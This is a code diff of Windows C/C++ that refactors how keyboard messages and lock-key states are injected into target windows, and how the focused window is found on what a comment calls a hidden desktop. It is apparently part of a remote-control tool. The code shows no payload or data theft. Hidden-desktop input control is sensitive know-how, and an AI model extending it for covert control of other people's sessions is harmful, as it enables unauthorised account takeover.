@@ -787,10 +787,8 @@ static LPARAM key_lparam(WORD vk, bool keyUp) {
 
 static void send_key_msg(HWND hwnd, WORD vk, bool down) {
     if (!hwnd || !IsWindow(hwnd)) return;
-    UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
-    LPARAM lp = 1 | (scan << 16);
-    if (!down) lp |= 0xC0000000;
-    SendMessageW(hwnd, down ? WM_KEYDOWN : WM_KEYUP, vk, lp);
+    LPARAM lp = key_lparam(vk, !down);
+    SendMessageW(hwnd, down ? WM_KEYDOWN : WM_KEYUP, (WPARAM)vk, lp);
 }
 
 static void sync_keyboard_state(HWND hTarget, int lockState, int modifierState) {
@@ -818,16 +816,16 @@ static void sync_keyboard_state(HWND hTarget, int lockState, int modifierState) 
 
         // Toggle Keys (Caps, Num, Scroll)
         if (currentCaps != desiredCaps) {
-            PostMessageW(hTarget, WM_KEYDOWN, VK_CAPITAL, key_lparam(VK_CAPITAL, false));
-            PostMessageW(hTarget, WM_KEYUP, VK_CAPITAL, key_lparam(VK_CAPITAL, true));
+            SendMessageW(hTarget, WM_KEYDOWN, VK_CAPITAL, key_lparam(VK_CAPITAL, false));
+            SendMessageW(hTarget, WM_KEYUP, VK_CAPITAL, key_lparam(VK_CAPITAL, true));
         }
         if (currentNum != desiredNum) {
-            PostMessageW(hTarget, WM_KEYDOWN, VK_NUMLOCK, key_lparam(VK_NUMLOCK, false));
-            PostMessageW(hTarget, WM_KEYUP, VK_NUMLOCK, key_lparam(VK_NUMLOCK, true));
+            SendMessageW(hTarget, WM_KEYDOWN, VK_NUMLOCK, key_lparam(VK_NUMLOCK, false));
+            SendMessageW(hTarget, WM_KEYUP, VK_NUMLOCK, key_lparam(VK_NUMLOCK, true));
         }
         if (currentScroll != desiredScroll) {
-            PostMessageW(hTarget, WM_KEYDOWN, VK_SCROLL, key_lparam(VK_SCROLL, false));
-            PostMessageW(hTarget, WM_KEYUP, VK_SCROLL, key_lparam(VK_SCROLL, true));
+            SendMessageW(hTarget, WM_KEYDOWN, VK_SCROLL, key_lparam(VK_SCROLL, false));
+            SendMessageW(hTarget, WM_KEYUP, VK_SCROLL, key_lparam(VK_SCROLL, true));
         }
 
         // Modifiers (Shift, Ctrl, Alt)
@@ -949,13 +947,17 @@ static void activate_target_window(HWND hTarget, UINT mouseMsg, LRESULT hitTest)
 //  Yardımcı: Odaklanmış pencereyi bul (gizli desktop'ta)
 // -----------------------------------------------------------------------
 static HWND GetFocusedWindow() {
+    GUITHREADINFO gti = { sizeof(GUITHREADINFO) };
+    if (GetGUIThreadInfo(0, &gti) && gti.hwndFocus) {
+        return gti.hwndFocus;
+    }
+
     HWND hTarget = g_hCurrentFocus;
     if (!hTarget || !IsWindow(hTarget)) hTarget = GetForegroundWindow();
     if (!hTarget || !IsWindow(hTarget)) hTarget = g_hLastWindow;
     if (!hTarget || !IsWindow(hTarget)) return NULL;
 
     DWORD threadId = GetWindowThreadProcessId(hTarget, NULL);
-    GUITHREADINFO gti = { sizeof(GUITHREADINFO) };
     if (GetGUIThreadInfo(threadId, &gti)) {
         if (gti.hwndFocus) return gti.hwndFocus;
         if (gti.hwndCaret) return gti.hwndCaret;
